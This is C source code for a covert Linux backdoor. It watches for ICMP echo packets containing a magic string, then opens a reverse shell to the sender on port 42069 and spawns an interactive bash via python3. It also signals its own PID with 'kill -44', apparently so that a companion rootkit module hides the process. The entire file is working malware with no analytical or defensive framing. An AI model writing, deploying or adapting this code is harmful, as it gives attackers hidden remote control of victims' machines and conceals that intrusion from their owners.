#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

#define MAGIC_PACKET "fuxSocy_RUN_BACKDOOR"
#define PORT 42069
void reverse_shell(in_addr_t s_addr) {
	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(PORT);
	sa.sin_addr.s_addr = s_addr;

	int sockt = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0)
		return;

	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);

	//we already know python is installed
	char *const argv[] = { "python3", "-c", "import pty, os; os.putenv('TERM','xterm'); os.system('clear'); pty.spawn('/bin/bash')", NULL };
	execve("/usr/bin/python3", argv, NULL);
}
void hide_self() {
	char buffer[16];
	snprintf(buffer, sizeof(buffer), "kill -44 %d", getpid());
	system(buffer);
}
int main() {
	hide_self();
	char buffer[1024];
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	while (1) {
		int len = recv(sockfd, buffer, sizeof(buffer), 0);
		struct iphdr *ip = (void *)buffer;
		if (ip->protocol != IPPROTO_ICMP) continue;
		struct icmphdr *icmp = (void *)(buffer + ip->ihl * 4);
		if (icmp->type != ICMP_ECHO) continue;
		char *payload = (void *)(icmp + 1);
		if (!memcmp(payload, MAGIC_PACKET, sizeof(MAGIC_PACKET)-1)) {
			pid_t pid = fork();
			if (!pid) {
				//the module hides the child process as well
				reverse_shell(ip->saddr);
				_exit(0);
			}
		}
	}
}

